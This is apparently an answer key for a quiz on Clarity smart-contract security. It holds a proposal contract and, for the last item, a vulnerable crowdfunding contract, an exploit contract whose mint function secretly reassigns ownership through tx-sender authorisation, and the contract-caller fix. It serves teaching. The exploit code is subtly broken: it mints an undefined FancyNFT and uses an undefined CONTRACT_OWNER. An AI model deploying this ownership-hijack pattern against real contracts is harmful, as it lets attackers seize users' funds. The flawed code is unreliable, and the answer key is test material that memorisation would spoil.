# Quiz 10: Security and Optimization

## Answer Key

1. True
2. c) Always using unwrap! instead of unwrap-panic
3. False
4. all answers are valid
5. True
6. a) Using tx-sender or contract-caller for authorization checks
7. True
8. b) Using a hash or merkle root of the data and storing only that on-chain
9. Code snippet below

```clarity
;; Proposal Contract

(define-data-var proposalId uint u0)

(define-map Proposals uint {
  title: (string-ascii 50),
  description: (string-ascii 250),
  proposedBy: principal,
  startAtBlockHeight: uint,
  endAtBlockHeight: uint,
  execute: bool
})

(define-public (create-proposal (title (string-ascii 50)) (description (string-ascii 250)))
  (let
    (
      (nextProposalId (var-get proposalId))
    )
    (map-set Proposals nextProposalId { title: title, description: description, proposedBy: tx-sender, startAtBlockHeight: (+ block-height u144), endAtBlockHeight: (+ block-height u1008), execute: false })
    (ok (var-set proposalId (+ (var-get proposalId) u1)))
  )
)

(define-read-only (get-proposal (id uint))
  (match (map-get? Proposals id) proposal
    (some {
      title: (get title proposal),
      description: (get description proposal),
      proposedBy: (get proposedBy proposal)
    })
    none
  )
)
```

10. Code snippet below

```clarity
;; Vulnerable contract

;; (define-constant ERR_ONLY_OWNER (err u100))
;; (define-constant ERR_CAMPAIGN_DOES_NOT_EXISTS (err u101))
;; (define-constant ERR_CAMPAIGN_NOT_OVER (err u102))

;; (define-data-var contractOwner principal tx-sender)
;; (define-data-var nextCampaignId uint u1)

;; (define-map Campaigns uint { title: (string-ascii 50), proposedBy: principal, fundsRaised: uint, endsAtBlockHeight: uint })

;; (define-public (create-campaign (title (string-ascii 50)) (amount uint))
;;   (let
;;     (
;;       (campaignId (var-get nextCampaignId))
;;     )
;;     (begin
;;       (try! (stx-transfer? amount tx-sender (as-contract tx-sender)))
;;       (map-set Campaigns campaignId { title: title, proposedBy: tx-sender, fundsRaised: amount, endsAtBlockHeight: (+ block-height u144) })
;;       (ok (var-set nextCampaignId (+ campaignId u1)))
;;     )
;;   )
;; )

;; (define-public (change-owner (newOwner principal))
;;   (begin
;;     (asserts! (is-eq tx-sender (var-get contractOwner)) ERR_ONLY_OWNER)
;;     (ok (var-set contractOwner newOwner))
;;   )
;; )

;; ;; Only the `contractOwner` can control the withdraw of funds
;; (define-public (withdraw-funds (campaignId uint) (destinationAddress principal))
;;   (begin
;;     (asserts! (is-eq tx-sender (var-get contractOwner)) ERR_ONLY_OWNER)
;;     (asserts! (is-some (get-campaign campaignId)) ERR_CAMPAIGN_DOES_NOT_EXISTS)
;;     (if (>= block-height (unwrap-panic (get endsAtBlockHeight (get-campaign campaignId))))
;;       (as-contract (stx-transfer? (unwrap-panic (get fundsRaised (get-campaign campaignId))) tx-sender destinationAddress))
;;       ERR_CAMPAIGN_NOT_OVER
;;     )
;;   )
;; )

;; (define-read-only (get-campaign (id uint))
;;   (map-get? Campaigns id)
;; )

;; (define-read-only (get-owner)
;;   (var-get contractOwner)
;; )

;; -----

;; Exploit Contract

(define-non-fungible-token TrickyNFT uint)
(define-data-var lastId uint u0)

(define-public (mint)
  (let
    (
      (newId (+ (var-get lastId) u1))
    )
    (is-ok (contract-call? .contract-0 change-owner CONTRACT_OWNER)) ;; if the contract owner goes to mint this nft, it will unwillingly go and update the owner of the contract
    (var-set lastId newId)
    (nft-mint? FancyNFT newId tx-sender)
  )
)

;; The FIX
;; Use `contract-caller` instead of `tx-sender`, which will change the context of the principal calling into the vulnerable contract

;; (define-public (change-owner (newOwner principal))
;;   (begin
;;     (asserts! (is-eq contract-caller (var-get contractOwner)) ERR_ONLY_OWNER)
;;     (ok (var-set contractOwner newOwner))
;;   )
;; )

;; Steps
;; 1. The vulnerable contract should be deployed at `contract-0`, so make sure to reference it.
;; 2. Write your contract attempting to exploit the vulnerable contract.
;; 3. Deploy an updated vulnerable contract with the necessary changes that would prevent your exploit.
```
